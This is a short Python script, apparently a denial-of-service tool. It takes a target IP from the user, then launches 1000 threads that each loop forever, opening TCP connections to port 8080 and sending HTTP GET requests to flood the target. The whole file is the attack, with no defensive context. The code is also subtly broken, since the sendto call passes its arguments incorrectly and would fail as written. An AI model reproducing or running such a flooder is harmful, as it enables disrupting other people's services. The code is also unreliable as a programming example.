import socket
import threading


ip = input("enter the ip address\n")
port = 8080

def attack():

    while True:

        s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendto(('GET /'+ ip +' HTTP/1.1\r\n').encode('ascii', (ip, port)))


for _ in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
